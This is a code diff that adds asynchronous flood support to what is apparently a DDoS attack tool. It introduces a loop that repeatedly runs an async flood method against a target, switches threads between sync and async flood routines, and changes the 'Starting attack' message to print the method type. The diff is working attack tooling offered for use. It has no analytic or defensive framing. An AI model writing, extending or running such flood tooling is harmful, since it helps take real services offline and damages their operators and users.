@@ -1,11 +1,18 @@
 # Import modules
+import asyncio
+import inspect
 from time import time, sleep
 from threading import Thread
-from typing import Callable
+from typing import Callable, Awaitable
 from colorama import Fore
 from humanfriendly import format_timespan, Spinner
 from tools.crash import CriticalError
 from tools.ipTools import GetTargetAddress, InternetConnectionCheck
+
+
+# Methods that use async
+_ASYNC_METHODS = {"HTTP"}
+
 
 def GetMethodByName(method: str) -> Callable:
     """Find and import DDoS method by name.
@@ -43,6 +50,18 @@ def GetMethodByName(method: str) -> Callable:
         return  # Unreachable, but satisfies type checker
 
 
+def is_async_method(method: str) -> bool:
+    """Check if method uses async.
+    
+    Args:
+        method: Method name
+        
+    Returns:
+        True if method is async, False otherwise
+    """
+    return method.upper() in _ASYNC_METHODS
+
+
 class AttackMethod:
     """Class to control attack methods."""
     
@@ -63,6 +82,7 @@ class AttackMethod:
         self.threads: list[Thread] = []
         self.is_running = False
         self.method: Callable | None = None
+        self.is_async = is_async_method(name)
 
     def __enter__(self):
         """Context manager entry."""
@@ -94,6 +114,23 @@ class AttackMethod:
                 print(f"{Fore.RED}[!] {Fore.MAGENTA}Error in flood thread: {e}{Fore.RESET}")
                 sleep(0.1)
 
+    def __RunAsyncFlood(self) -> None:
+        """Run async flood method in loop."""
+        assert self.method is not None, "Method not initialized. Use context manager."
+        
+        # Check if method is a coroutine function
+        if asyncio.iscoroutinefunction(self.method):
+            while self.is_running:
+                try:
+                    # Run async method in event loop
+                    asyncio.run(self.method(self.target))
+                except Exception as e:
+                    print(f"{Fore.RED}[!] {Fore.MAGENTA}Error in async flood: {e}{Fore.RESET}")
+                    sleep(0.1)
+        else:
+            # Fallback to sync execution
+            self.__RunFlood()
+
     def __RunThreads(self) -> None:
         """Start and manage threads."""
         # Run timer thread
@@ -102,7 +139,10 @@ class AttackMethod:
         
         # Create flood threads
         for _ in range(self.threads_count):
-            thread = Thread(target=self.__RunFlood)
+            if self.is_async:
+                thread = Thread(target=self.__RunAsyncFlood)
+            else:
+                thread = Thread(target=self.__RunFlood)
             self.threads.append(thread)
         
         # Start flood threads
@@ -125,8 +165,10 @@ class AttackMethod:
         """Start DDoS attack."""
         target = str(self.target).strip("()").replace(", ", ":").replace("'", "")
         duration = format_timespan(self.duration)
+        
+        method_type = "async" if self.is_async else "sync"
         print(
-            f"{Fore.MAGENTA}[?] {Fore.BLUE}Starting attack to {target} using method {self.name}.{Fore.RESET}\n"
+            f"{Fore.MAGENTA}[?] {Fore.BLUE}Starting {method_type} attack to {target} using method {self.name}.{Fore.RESET}\n"
             f"{Fore.MAGENTA}[?] {Fore.BLUE}Attack will be stopped after {Fore.MAGENTA}{duration}{Fore.BLUE}.{Fore.RESET}"
         )
         self.is_running = True
